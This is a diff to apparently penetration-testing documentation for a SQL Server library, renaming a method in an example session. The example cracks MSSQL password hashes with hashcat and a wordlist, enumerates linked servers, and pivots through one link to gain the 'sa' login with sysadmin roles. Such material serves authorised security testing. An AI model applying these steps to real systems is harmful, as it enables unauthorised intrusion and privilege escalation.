@@ -118,7 +118,7 @@ hashcat -O -w 3 -a 0 -m 1731 --username ./hashes.txt ./rockyou.txt
 >>> client.login(username='webapp11', password='redacted', windows_auth=False)
 >>> client.enum_links()
 {'SQL11\\SQLEXPRESS': {'local_login': 'NULL', 'remote_login': 'NULL'}, 'SQL27': {'local_login': 'webapp11', 'remote_login': 'webappGroup'}, 'SQL53': {'local_login': 'webapp11', 'remote_login': 'testAccount'}}
->>> linked_instance = client.use_link('SQL27')
+>>> linked_instance = client.use_rpc_link('SQL27')
 >>> linked_instance.whoami()
 {'host': 'sql27', 'login': 'sa', 'user': 'dbo', 'roles': {'db_denydatareader', 'dbcreator', 'db_datareader', 'public', 'db_denydatawriter', 'db_accessadmin', 'setupadmin', 'serveradmin', 'db_backupoperator', 'diskadmin', 'bulkadmin', 'db_owner', 'securityadmin', 'sysadmin', 'db_datawriter', 'processadmin', 'db_ddladmin', 'db_securityadmin'}}
 ~~~
